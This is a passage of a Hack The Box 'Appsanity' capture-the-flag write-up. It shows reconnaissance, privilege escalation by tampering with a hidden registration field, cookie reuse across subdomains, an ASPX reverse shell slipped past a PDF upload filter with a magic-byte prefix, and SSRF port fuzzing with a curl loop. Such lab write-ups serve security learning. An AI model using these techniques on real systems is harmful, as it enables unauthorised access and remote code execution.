+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">80/tcp   open  http    Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to https://meddigi.htb/
+</span></span><span class="line"><span class="cl">443/tcp  open  https?
+</span></span><span class="line"><span class="cl">5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">|_http-title: Not Found
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 20.62 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We see Microsoft IIS on port 80/443, and port 5985 - the WinRM port- open. With such a small attack surface, this is likely a web-based entrypoint. First we must add <code>meddigi.htb</code> to our hosts file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ cat /etc/hosts
+</span></span><span class="line"><span class="cl">127.0.0.1       localhost
+</span></span><span class="line"><span class="cl">127.0.1.1       kali
+</span></span><span class="line"><span class="cl">::1             localhost ip6-localhost ip6-loopback
+</span></span><span class="line"><span class="cl">ff02::1         ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2         ip6-allrouters
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">10.129.154.179 meddigi.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In an interesting start, it appears http access is not allowed:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ curl http://meddigi.htb/                                                 
+</span></span><span class="line"><span class="cl">&lt;head&gt;&lt;title&gt;Document Moved&lt;/title&gt;&lt;/head&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;&lt;h1&gt;Object Moved&lt;/h1&gt;This document may be found &lt;a HREF=&#34;https://meddigi.htb/&#34;&gt;here&lt;/a&gt;&lt;/body&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We are redirected to https.</p>
+<p><img src="/post/hackthebox-appsanity/Images/landingpage.png"
+	width="1889"
+	height="627"
+	srcset="/post/hackthebox-appsanity/Images/landingpage_hu24463914275c8578122a0a9d4618602e_703145_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/landingpage_hu24463914275c8578122a0a9d4618602e_703145_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Landing Page"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="301"
+		data-flex-basis="723px"
+	
+></p>
+<p>There is an option for login/register here, and further down the main page a section where we might &ldquo;request a call-back&rdquo;. Handling a fake number calling method is something I know very little about, so I start with checking out the sign in/sign up pages:</p>
+<h3 id="enumerating-account-registration">Enumerating account registration</h3>
+<p><img src="/post/hackthebox-appsanity/Images/signup.png"
+	width="829"
+	height="820"
+	srcset="/post/hackthebox-appsanity/Images/signup_hua88f288bc4335c1f41f41caa6e974867_43293_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/signup_hua88f288bc4335c1f41f41caa6e974867_43293_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="101"
+		data-flex-basis="242px"
+	
+></p>
+<p>Upon login, we enter the Profile page, where we might edit our own information or perhaps send a message to supervisors:</p>
+<p><img src="/post/hackthebox-appsanity/Images/ProfilePage.png"
+	width="1771"
+	height="629"
+	srcset="/post/hackthebox-appsanity/Images/ProfilePage_hu96ecdd7ec083a0aebbe0c32b57d4a656_57811_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/ProfilePage_hu96ecdd7ec083a0aebbe0c32b57d4a656_57811_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="281"
+		data-flex-basis="675px"
+	
+></p>
+<p>When we check the request contents for changing account information, we see a RequestVerificationToken. If this is implemented correctly, we cannot try changing another user&rsquo;s account information.</p>
+<p><img src="/post/hackthebox-appsanity/Images/ProfileEdit1.png"
+	width="510"
+	height="556"
+	srcset="/post/hackthebox-appsanity/Images/ProfileEdit1_hu0d306c23408cbda4da1ae7b51b2f48e3_64824_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/ProfileEdit1_hu0d306c23408cbda4da1ae7b51b2f48e3_64824_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="91"
+		data-flex-basis="220px"
+	
+></p>
+<p>Request data:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Name=asdf&amp;LastName=asdf&amp;Email=asdf%40asdf.asdf&amp;PhoneNumber=1234567890&amp;Password=Appsanity&amp;ConfirmPassword=Appsanity1&amp;__RequestVerificationToken=CfDJ8HpmXdLrgsRMlajdq9P0hbKlkYzqet5VlcN2s9Era-YfuLJbHOjhX49GbZsoiy2SUrOp5HavzSiljfijL_S159CPXuIujVO9vADztksoVOpBKO8veQrv2oRdBeupiV-0k2-8h9rMTAUm5RcQirzr5hd1WOVTlZMAik1CxCftgdtyf_4vzJWXPpYcVtQ7xH_TLA
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can send something to Supervisors, but it appears we don&rsquo;t have a way to view our request. Currently, the best we can probably do is send an XSS payload either in this message location, or perhaps earlier on the call-back form.</p>
+<h3 id="discovery-of-portal-subdomain">Discovery of portal subdomain</h3>
+<p>We can try <code>gobuster</code> to enumerate subdomains:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Appsanity</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">gobuster</span> <span class="n">vhost</span> <span class="o">-</span><span class="n">u</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">meddigi</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">110000.</span><span class="n">txt</span> <span class="o">--</span><span class="n">append</span><span class="o">-</span><span class="n">domain</span> <span class="o">-</span><span class="n">k</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Gobuster</span> <span class="n">v3</span><span class="o">.</span><span class="mi">6</span>
+</span></span><span class="line"><span class="cl"><span class="n">by</span> <span class="n">OJ</span> <span class="n">Reeves</span> <span class="p">(</span><span class="err">@</span><span class="n">TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">Christian</span> <span class="n">Mehlmauer</span> <span class="p">(</span><span class="err">@</span><span class="n">firefart</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Url</span><span class="p">:</span>             <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">meddigi</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Method</span><span class="p">:</span>          <span class="n">GET</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Threads</span><span class="p">:</span>         <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Wordlist</span><span class="p">:</span>        <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">110000.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">User</span> <span class="n">Agent</span><span class="p">:</span>      <span class="n">gobuster</span><span class="o">/</span><span class="mf">3.6</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Timeout</span><span class="p">:</span>         <span class="mi">10</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Append</span> <span class="n">Domain</span><span class="p">:</span>   <span class="bp">true</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Starting</span> <span class="n">gobuster</span> <span class="ow">in</span> <span class="n">VHOST</span> <span class="n">enumeration</span> <span class="n">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Found</span><span class="p">:</span> <span class="n">portal</span><span class="o">.</span><span class="n">meddigi</span><span class="o">.</span><span class="n">htb</span> <span class="n">Status</span><span class="p">:</span> <span class="mi">200</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">2976</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can find another at <code>portal.meddigi.htb</code>:</p>
+<p><img src="/post/hackthebox-appsanity/Images/portalpage.png"
+	width="1084"
+	height="459"
+	srcset="/post/hackthebox-appsanity/Images/portalpage_huf936b36977d6610d8132c2e6051d92f8_71862_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/portalpage_huf936b36977d6610d8132c2e6051d92f8_71862_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="236"
+		data-flex-basis="566px"
+	
+></p>
+<p>There is not much we can do here, and directory fuzzing didn&rsquo;t show us anything else we might view without valid credentials first.</p>
+<h3 id="examining-authenitcation-token">Examining authenitcation token</h3>
+<p>Decoding our JWT token might be interesting. Note in this token I am decoding another account I tried (and successfully made), with the email <code>admin@appsanity.htb</code>. The goal was to see if I could find potentially existing usernames, which didn&rsquo;t work out.</p>
+<p><img src="/post/hackthebox-appsanity/Images/jwt.png"
+	width="1182"
+	height="505"
+	srcset="/post/hackthebox-appsanity/Images/jwt_hu4c9aba03782c9b816a03ac05229cd885_74868_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/jwt_hu4c9aba03782c9b816a03ac05229cd885_74868_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="234"
+		data-flex-basis="561px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  &#34;unique_name&#34;: &#34;7&#34;,
+</span></span><span class="line"><span class="cl">  &#34;email&#34;: &#34;admin@appsanity.htb&#34;,
+</span></span><span class="line"><span class="cl">  &#34;nbf&#34;: 1698539553,
+</span></span><span class="line"><span class="cl">  &#34;exp&#34;: 1698543153,
+</span></span><span class="line"><span class="cl">  &#34;iat&#34;: 1698539553,
+</span></span><span class="line"><span class="cl">  &#34;iss&#34;: &#34;MedDigi&#34;,
+</span></span><span class="line"><span class="cl">  &#34;aud&#34;: &#34;MedDigiUser&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Normally JWT tokens are signed with an internal key (blue text) and the signing method is described in the header (red text). An occasional misconfiguration might be a situation where the signature is never actually verified, or will accept an signing algorithm type of &ldquo;None&rdquo;. In these situations we might forge our own token to assume the identity of another user. Unfortunately, this does not work for us. When I edit my <code>unique_name</code> to be that of an earlier user, for example 1, my authentication is rejected and I am placed outside of authentication pages.</p>
+<h3 id="editing-hidden-variable-in-registration">Editing hidden variable in registration</h3>
+<p>When making account notice the final variable, acctype:
+<img src="/post/hackthebox-appsanity/Images/signup1.png"
+	width="500"
+	height="450"
+	srcset="/post/hackthebox-appsanity/Images/signup1_hu2a9f92fb128e54e3118c43d108d71d23_49567_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/signup1_hu2a9f92fb128e54e3118c43d108d71d23_49567_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="111"
+		data-flex-basis="266px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Name=asdf&amp;LastName=asdf&amp;Email=admin1%40appsanity.htb&amp;Password=Appsanity1&amp;ConfirmPassword=Appsanity1&amp;DateOfBirth=1999-01-01&amp;PhoneNumber=1234567890&amp;Country=asdf&amp;Acctype=1&amp;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is a patient account type. However, we can just manually change the value to 2. Now we have higher privileges:</p>
+<p><img src="/post/hackthebox-appsanity/Images/supervise1.png"
+	width="438"
+	height="312"
+	srcset="/post/hackthebox-appsanity/Images/supervise1_hu501ecc9e2b9cfe526dc39292988c5153_15389_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/supervise1_hu501ecc9e2b9cfe526dc39292988c5153_15389_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="140"
+		data-flex-basis="336px"
+	
+></p>
+<p>My new account is considered a Doctor, and I have the new option of adding patients. When I add myself as supervising my older account, I can now see it upon logging in as the other user. At this point, it&rsquo;s looking like a lot of back-and-forth. To make the process a little easier, I opened a new incognito tab to flush cookies, and in that tab logged in as the patient user while in my original tab I am the supervisor user.</p>
+<p><img src="/post/hackthebox-appsanity/Images/supervise2.png"
+	width="235"
+	height="430"
+	srcset="/post/hackthebox-appsanity/Images/supervise2_hu1ad9b9e12c25ebc0fbda75b921a72665_11985_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/supervise2_hu1ad9b9e12c25ebc0fbda75b921a72665_11985_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="54"
+		data-flex-basis="131px"
+	
+></p>
+<p>Although I can send a message to my supervisor, I&rsquo;m not seeing any way to interact with the message.</p>
+<h3 id="accessing-portal-subdomain-through-cookie-re-use">Accessing portal subdomain through cookie re-use</h3>
+<p>Although we don&rsquo;t have the access token to log into <code>portal.meddigi.htb</code>, we have a valid access token for the main site. When I try to add my valid cookie to portal, it lets me in:</p>
+<p><img src="/post/hackthebox-appsanity/Images/tokentransplant.png"
+	width="1254"
+	height="571"
+	srcset="/post/hackthebox-appsanity/Images/tokentransplant_hu44b0345cab6ba6d3bad3a21a38e3dd39_56719_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/tokentransplant_hu44b0345cab6ba6d3bad3a21a38e3dd39_56719_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="219"
+		data-flex-basis="527px"
+	
+></p>
+<h3 id="file-upload-potential-in-portal-subdomain">File upload potential in portal subdomain</h3>
+<p>Notably interesting, the upload exam report section
+Only pdf is allowed. Is this magic byte verification?</p>
+<p><img src="/post/hackthebox-appsanity/Images/pdfonly.png"
+	width="925"
+	height="301"
+	srcset="/post/hackthebox-appsanity/Images/pdfonly_hu40f746ba708c560333fc4756d63dcc1a_24308_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/pdfonly_hu40f746ba708c560333fc4756d63dcc1a_24308_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="307"
+		data-flex-basis="737px"
+	
+></p>
+<p>We can add magic byte to trick the upload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Appsanity]
+</span></span><span class="line"><span class="cl">└─$ head shell.aspx
+</span></span><span class="line"><span class="cl">%PDF-1.5
+</span></span><span class="line"><span class="cl">&lt;%@ Page Language=&#34;C#&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ Import Namespace=&#34;System.Runtime.InteropServices&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ Import Namespace=&#34;System.Net&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ Import Namespace=&#34;System.Net.Sockets&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ Import Namespace=&#34;System.Security.Principal&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ Import Namespace=&#34;System.Data.SqlClient&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;script runat=&#34;server&#34;&gt;
+</span></span><span class="line"><span class="cl">//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Appsanity]
+</span></span><span class="line"><span class="cl">└─$ file shell.aspx 
+</span></span><span class="line"><span class="cl">shell.aspx: PDF document, version 1.5
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>By doing this, our payload is accepted.</p>
+<p><img src="/post/hackthebox-appsanity/Images/upload.png"
+	width="1232"
+	height="636"
+	srcset="/post/hackthebox-appsanity/Images/upload_hueb5b8254cf3cbd277b4551a2a7072cf4_50388_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/upload_hueb5b8254cf3cbd277b4551a2a7072cf4_50388_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="193"
+		data-flex-basis="464px"
+	
+></p>
+<h3 id="remote-connection-possible-in-prescription-link-submission">Remote connection possible in Prescription Link submission</h3>
+<p>On the <code>Issue Prescriptions</code> tab, there is an option to submit a prescription link. When we supply our own address, we can get a connection back:</p>
+<p><img src="/post/hackthebox-appsanity/Images/prescriptionlink.png"
+	width="1604"
+	height="447"
+	srcset="/post/hackthebox-appsanity/Images/prescriptionlink_hu8a1372f1dde57d6c0902db2b41724154_45411_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/prescriptionlink_hu8a1372f1dde57d6c0902db2b41724154_45411_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="358"
+		data-flex-basis="861px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Appsanity]
+</span></span><span class="line"><span class="cl">└─$ nc -nvlp 80     
+</span></span><span class="line"><span class="cl">listening on [any] 80 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.134] from (UNKNOWN) [10.129.154.179] 56535
+</span></span><span class="line"><span class="cl">GET /asdf HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.10.14.134
+</span></span><span class="line"><span class="cl">traceparent: 00-d84be00c1219df2a746a0b1f8660d6fa-ed08423e51158377-00
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Unfortunately, only http and https methods are allowed. Additionally, no NTLM authentication is sent for Responder capturing.</p>
+<h3 id="ssrf-potential-in-prescription-link">SSRF potential in Prescription Link</h3>
+<p>Although the responses on web pages are somewhat unintuitive, we might discover that SSRF is possible. The most obvious way to see this is by sending an http request to the Win-RM port, as it shows a <code>404 not found</code> error:</p>
+<p><img src="/post/hackthebox-appsanity/Images/ssrfwinrm.png"
+	width="888"
+	height="672"
+	srcset="/post/hackthebox-appsanity/Images/ssrfwinrm_huf3072801825c68dd1051ae02f3877541_37481_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/ssrfwinrm_huf3072801825c68dd1051ae02f3877541_37481_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="132"
+		data-flex-basis="317px"
+	
+></p>
+<p>Unlike a lot of ports that hang on http requests, winrm will always respond with this <code>404</code>. This is nice to see, because strangely enough sending requests to port 80 or 443 does not work well.</p>
+<h3 id="fuzzing-internal-ports-via-ssrf">Fuzzing internal ports via SSRF</h3>
+<p>Since we know we are accessing ports internally, we might find a port open only for internal requests. We can fuzz for this. For whatever reason, <code>ffuf</code> will not fuzz properly, so I chose to fuzz using a for loop with <code>curl</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="o">{</span>1..65535<span class="o">}</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> <span class="k">do</span> curl -s <span class="s1">&#39;https://portal.meddigi.htb/Prescriptions/SendEmail&#39;</span> -b <span class="s1">&#39;access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjkiLCJlbWFpbCI6ImFzZGYxQGFzZGYuYXNkZiIsIm5iZiI6MTY5OTA1MTYzMywiZXhwIjoxNjk5MDU1MjMzLCJpYXQiOjE2OTkwNTE2MzMsImlzcyI6Ik1lZERpZ2kiLCJhdWQiOiJNZWREaWdpVXNlciJ9.j3hHqxHUFtMWtxy52NIeCbaYG-CluoOubN1_kOTJ2YM; .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8CrSHtzBF1JNhsF1CyVvUorTLizskLt_8YolzUh3Z-GepR2ZGiTyxSHB4G4ksqt6mFe3ajKZtH5kaY75bmGRptGuDdZqAGUaB6B-N0vKM8s-b6gBw9RcZJRuwqCSP-gjpKwsNqgEflJpT4_DBTPmm_k&#39;</span> -d <span class="s2">&#34;Email=asdf@asdf.asdf&amp;Link=http://127.0.0.1:</span><span class="nv">$i</span><span class="s2">&#34;</span> -k<span class="p">;</span> <span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The method is ridiculously slow, but it does get the job done.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">5984
+</span></span><span class="line"><span class="cl">5985
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 4.01//EN&#34;&#34;http://www.w3.org/TR/html4/strict.dtd&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;
+</span></span><span class="line"><span class="cl">&lt;META HTTP-EQUIV=&#34;Content-Type&#34; Content=&#34;text/html; charset=us-ascii&#34;&gt;&lt;/HEAD&gt;
+</span></span><span class="line"><span class="cl">&lt;BODY&gt;&lt;h2&gt;Not Found&lt;/h2&gt;
+</span></span><span class="line"><span class="cl">&lt;hr&gt;&lt;p&gt;HTTP Error 404. The requested resource is not found.&lt;/p&gt;
+</span></span><span class="line"><span class="cl">&lt;/BODY&gt;&lt;/HTML&gt;
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">8078
+</span></span><span class="line"><span class="cl">8079
+</span></span><span class="line"><span class="cl">8080
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">    &lt;meta charset=&#34;utf-8&#34; /&gt;
+</span></span><span class="line"><span class="cl">    &lt;title&gt;Examinations Panel&lt;/title&gt;
+</span></span><span class="line"><span class="cl">    &lt;style&gt;
+</span></span><span class="line"><span class="cl">        /* Center the table on the page */
+</span></span><span class="line"><span class="cl">        table {
+</span></span><span class="line"><span class="cl">            margin: 0 auto;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        /* Optional: If you want to set a max width and ensure the table does not stretch full screen */
+</span></span><span class="line"><span class="cl">        body {
+</span></span><span class="line"><span class="cl">            max-width: 1200px;
+</span></span><span class="line"><span class="cl">            margin: 0 auto;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    &lt;/style&gt;
+</span></span><span class="line"><span class="cl">&lt;/head&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see our previously tested WinRM port returning a <code>404</code>, and also a page response on port 8080.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="remote-shell-access-via-ssrf--lfi-vulnerabilities">Remote Shell access via SSRF + LFI vulnerabilities</h3>
